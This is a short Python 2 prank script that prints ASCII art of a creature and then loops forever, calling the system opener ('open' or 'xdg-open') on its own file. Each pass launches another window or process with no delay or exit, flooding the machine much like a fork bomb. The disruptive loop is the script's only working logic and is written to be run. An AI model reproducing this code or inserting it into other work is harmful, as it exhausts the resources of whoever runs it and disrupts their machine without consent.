'''
Created on 7 Dec 2015

@author: Harry & BWBellairs
'''

import subprocess, sys


print "                        ___"
print "                     .-'   `'."
print "                    /         \ "
print "                    |         ; "
print "                    |         |           ___.--,"
print "           _.._     |0) ~ (0) |    _.---'`__.-( (_."
print "    __.--'`_.. '.__.\    '--. \_.-' ,.--'`     `""`"
print "   ( ,.--'`   ',__ /./;   ;, '.__.'`    __"
print "   _`) )  .---.__.' / |   |\   \__..--""  """'--.,'""
print "  `---' .'.''-._.-'`_./  /\ '.  \ _.-~~~````~~~-._`-.__.'"
print "        | |  .' _.-' |  |  \  \  '"
print "         \ \/ .'     \  \   '. '-._)"
print "          \/ /        \  \    `=.__`~-."
print "          / /\         `) )    / / `"".`\'"
print "    , _.-'.'\ \        / /    ( (     / /"
print "     `--~`   ) )    .-'.'      '.'.  | ("
print "         (/`    ( (`          ) )  '-;"
print "             `      '-;         (-'"
    
while True:
    opener = "open" if sys.platform == "darwin" else "xdg-open"
    subprocess.call([opener, sys.argv[0]])
